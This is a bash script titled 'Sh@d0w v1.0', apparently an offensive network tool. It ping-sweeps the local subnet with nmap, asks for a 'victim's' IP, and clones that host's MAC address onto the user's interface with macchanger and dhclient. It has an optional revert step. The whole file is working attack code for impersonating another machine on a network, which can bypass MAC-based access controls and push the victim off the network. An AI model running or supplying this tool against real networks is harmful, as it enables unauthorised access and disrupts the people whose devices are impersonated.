#!/bin/bash

echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"
echo "°                     Sh@d0w v1.0 - b33f                   °"
echo "°    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    °"
echo "°             -Don't panic, i'm only a shadow-             °"
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"
echo -n "° Select the Interface to use: "
read -e iface
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"

#List current connection details && look for live hosts
###################################################################
echo "[>] Current connection Details:" |sed 's/^/° /'
echo "°"

ip addr show $iface| grep "inet " |cut -d" " -f1-8 |sed 's/^/°/'
ip addr show $iface| grep "link/" |sed 's/^/°/'

echo "°"
echo "°    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     "
echo "°"
echo "° [>] Scanning for live hosts:"
echo "°"

for subnet in $(ip addr show $iface| grep "inet " |cut -d" " -f6); do
nmap -sP -oG /tmp/hosts.txt $subnet &>/dev/null; done

cat /tmp/hosts.txt |sed 's/^/°    /' |grep "Host:" |cut -d"(" -f1
rm /tmp/hosts.txt

#List victim details
###################################################################
echo "°"
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"
echo -n "° Select the victim's IP: "
read -e vic
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"
echo "[>] Victims connection details:" |sed 's/^/° /'
echo "°"

nmap -sP -oN /tmp/victim.txt $vic &>/dev/null & wait
cat /tmp/victim.txt |grep "report" |cut -d" " -f5 |sed 's/^/°    Host: /'
cat /tmp/victim.txt |grep "MAC" |cut -d" " -f3 |sed 's/^/°    MAC:  /'

#Initiate the cloning process || terminate program
###################################################################
echo "°"
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"
echo -n "° Shall we start cloning (y/n): "
read -e shadow
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"

if [ $shadow = y ]; then

echo "[>] Saving the original MAC of the interface" |sed 's/^/° /'
ip addr show eth0| grep "link/" |cut -d" " -f6 > /tmp/original.txt

echo "[>] Saving the victims MAC adress" |sed 's/^/° /'
cat /tmp/victim.txt |grep "MAC" |cut -d" " -f3 > /tmp/vicMAC.txt

rm /tmp/victim.txt

echo "°"
echo "°    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     "
echo "°"

echo "[>] Ifconfig $iface down" |sed 's/^/° /'
ifconfig $iface down

echo "[>] Cloning the MAC adress" |sed 's/^/° /'
for mac in $(cat /tmp/vicMAC.txt);do
macchanger -m $mac $iface &>/dev/null; done

echo "[>] Ifconfig $iface up" |sed 's/^/° /'
ifconfig $iface up
echo "[>] Reconnect to the network" |sed 's/^/° /'
dhclient $iface &>/dev/null & wait

echo "°"
echo "°    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     "
echo "°"

#Show the new cloned inetface data
###################################################################
echo "[>] Cloning process complete!!" |sed 's/^/° /'
echo "[>] These are your new connection details:" |sed 's/^/° /'
echo "°"

ip addr show $iface| grep "inet " |cut -d" " -f1-8 |sed 's/^/°/'
ip addr show $iface| grep "link/" |sed 's/^/°/'

echo "°"
echo "°    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     "
echo "°"
echo "° [>] Lets scan for those live host again:"
echo "°     [normally there will be one less]"
echo "°"

for subnet in $(ip addr show $iface| grep "inet " |cut -d" " -f6); do
nmap -sP -oG /tmp/hosts.txt $subnet &>/dev/null; done

cat /tmp/hosts.txt |sed 's/^/°    /' |grep "Host:" |cut -d"(" -f1
rm /tmp/hosts.txt

#Give user the options to revert to original settings
###################################################################
echo "°"
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"
echo -n "° Shall we revert the interface (y/n): "
read -e revert
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"

if [ $revert = y ]; then
echo "[>] Reverting the interface..." |sed 's/^/° /'

ifconfig $iface down

for mac in $(cat /tmp/original.txt);do
macchanger -m $mac $iface &>/dev/null; done

ifconfig $iface up
dhclient $iface &>/dev/null & wait

rm /tmp/vicMAC.txt
rm /tmp/original.txt

echo "[>] Done!" |sed 's/^/° /'
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"

elif [ $revert = n ]; then

rm /tmp/vicMAC.txt
echo "[>] Original MAC saved in /tmp/original.txt" |sed 's/^/° /'
echo "[>] Done!" |sed 's/^/° /'
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"

fi

elif [ $shadow = n ]; then

rm /tmp/victim.txt
echo "[>] Done!" |sed 's/^/° /'
echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"
fi